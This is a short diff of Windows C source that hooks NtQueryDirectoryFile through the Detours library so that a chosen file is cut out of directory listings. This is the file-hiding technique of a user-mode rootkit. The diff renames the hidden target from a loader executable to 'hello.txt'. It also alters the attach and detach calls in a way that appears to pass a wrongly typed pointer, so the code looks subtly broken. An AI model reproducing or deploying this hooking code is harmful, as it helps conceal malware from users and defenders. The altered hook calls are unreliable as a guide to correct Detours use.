@@ -7,8 +7,6 @@
 
 #pragma comment(lib, "includes\\detours\\detours.lib")
 
-
-
 /* ------------------------------------------------------------------------------------------------------ */
 
 fnNtQuerySystemInformation g_NtQuerySystemInformation;
@@ -88,7 +86,7 @@ NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE
             PFILE_ID_BOTH_DIR_INFO next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)current + current->NextEntryOffset);
 
             // comparing name
-            if (CompareToFileName(next, "HookLdr.exe") == TRUE) {
+            if (CompareToFileName(next, "hello.txt") == TRUE) {
                 if (next->NextEntryOffset != 0) {
                     next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)next + next->NextEntryOffset);
                     current->NextEntryOffset += next->NextEntryOffset;
@@ -111,14 +109,14 @@ VOID InstallHook(LPCSTR dll, LPCSTR function, LPVOID* originalFunction, LPVOID h
 
     *originalFunction = GetProcAddress(GetModuleHandleA(dll), function);
     if (*originalFunction)
-        DetourAttach(originalFunction, hookedFunction);
+        DetourAttach(&originalFunction, hookedFunction);
 
 }
 
 VOID Unhook(LPVOID* originalFunction, LPVOID hookedFunction) {
 
     if (*originalFunction)
-        DetourDetach(originalFunction, hookedFunction);
+        DetourDetach(&originalFunction, hookedFunction);
 
 }
 
